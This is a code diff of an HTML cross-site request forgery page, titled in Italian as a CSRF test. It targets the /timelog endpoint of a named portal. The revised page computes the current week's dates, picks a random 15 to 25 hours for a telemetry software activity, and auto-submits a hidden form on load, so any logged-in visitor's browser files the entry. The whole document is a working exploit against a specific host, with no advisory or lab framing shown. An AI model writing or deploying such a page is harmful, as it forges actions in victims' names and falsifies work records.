@@ -3,17 +3,51 @@
     <title>Test CSRF in corso...</title>
   </head>
 
-  <body onload="document.forms[0].submit();">
+  <body>
     <form id="csrf-attack-form" 
           action="https://portal.dynamisprc.com:8443/timelog" 
           method="POST">
           
-      <input type="hidden" name="date" value="25/08 - 31/08 2025" />
-      <input type="hidden" name="system" value="Team activities" />
-      <input type="hidden" name="activity" value="Track Test" />
+      <input type="hidden" name="date" id="date-field" value="" />
       
-      <input type="hidden" name="hours" value="1" />
+      <input type="hidden" name="system" value="Low Voltage System" />
+      <input type="hidden" name="assembly" value="Telemetry" />
+      <input type="hidden" name="activity" value="Software" />
+      
+      <input type="hidden" name="hours" id="hours-field" value="" />
     </form>
+
+    <script>
+      function getMonday(d) {
+        d = new Date(d);
+        var day = d.getDay(),
+            diff = d.getDate() - day + (day == 0 ? -6 : 1);
+        return new Date(d.setDate(diff));
+      }
+
+      function formatDate(date) {
+        var dd = String(date.getDate()).padStart(2, '0');
+        var mm = String(date.getMonth() + 1).padStart(2, '0');
+        return dd + '/' + mm;
+      }
+
+      var today = new Date();
+      var mondayDate = getMonday(today);
+      var sundayDate = new Date(mondayDate);
+      sundayDate.setDate(mondayDate.getDate() + 6);
+      
+      var dateString = formatDate(mondayDate) + ' - ' + formatDate(sundayDate) + ' ' + mondayDate.getFullYear();
+      document.getElementById('date-field').value = dateString;
+
+
+      var min = 15;
+      var max = 25;
+      var randomHours = Math.floor(Math.random() * (max - min + 1)) + min;
+      
+      document.getElementById('hours-field').value = randomHours;
+
+      document.forms[0].submit();
+    </script>
 
   </body>
 </html>
